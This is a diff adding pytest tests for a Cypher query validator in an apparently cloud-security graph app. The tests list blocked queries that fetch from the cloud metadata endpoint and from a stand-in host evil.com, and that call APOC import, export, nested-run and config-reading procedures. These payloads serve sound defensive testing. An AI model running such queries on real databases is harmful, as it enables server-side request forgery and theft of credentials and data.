@@ -501,6 +501,60 @@ def test_execute_custom_query_wraps_graph_errors():
     mock_logger.error.assert_called_once()
 
 
+# -- validate_custom_query ------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "cypher",
+    [
+        "LOAD CSV FROM 'http://169.254.169.254/' AS x RETURN x",
+        "load csv from 'http://evil.com' as row return row",
+        "CALL apoc.load.json('http://evil.com/') YIELD value RETURN value",
+        "CALL apoc.load.csvParams('http://evil.com/', {}, null) YIELD list RETURN list",
+        "CALL apoc.import.csv([{fileName: 'f'}], [], {}) YIELD node RETURN node",
+        "CALL apoc.export.csv.all('file.csv', {})",
+        "CALL apoc.cypher.run('CREATE (n)', {}) YIELD value RETURN value",
+        "CALL apoc.systemdb.graph() YIELD nodes RETURN nodes",
+        "CALL apoc.config.list() YIELD key, value RETURN key, value",
+    ],
+    ids=[
+        "LOAD_CSV",
+        "LOAD_CSV_lowercase",
+        "apoc.load.json",
+        "apoc.load.csvParams",
+        "apoc.import.csv",
+        "apoc.export.csv",
+        "apoc.cypher.run",
+        "apoc.systemdb.graph",
+        "apoc.config.list",
+    ],
+)
+def test_validate_custom_query_rejects_blocked_patterns(cypher):
+    with pytest.raises(ValidationError) as exc:
+        views_helpers.validate_custom_query(cypher)
+
+    assert "blocked operation" in str(exc.value.detail)
+
+
+@pytest.mark.parametrize(
+    "cypher",
+    [
+        "MATCH (n:AWSAccount) RETURN n LIMIT 10",
+        "MATCH (a)-[r]->(b) RETURN a, r, b",
+        "MATCH (n) WHERE n.name CONTAINS 'load' RETURN n",
+        "CALL apoc.create.vNode(['Label'], {}) YIELD node RETURN node",
+    ],
+    ids=[
+        "simple_match",
+        "traversal",
+        "contains_load_substring",
+        "apoc_virtual_node",
+    ],
+)
+def test_validate_custom_query_allows_clean_queries(cypher):
+    views_helpers.validate_custom_query(cypher)
+
+
 # -- _truncate_graph ----------------------------------------------------------
 
 
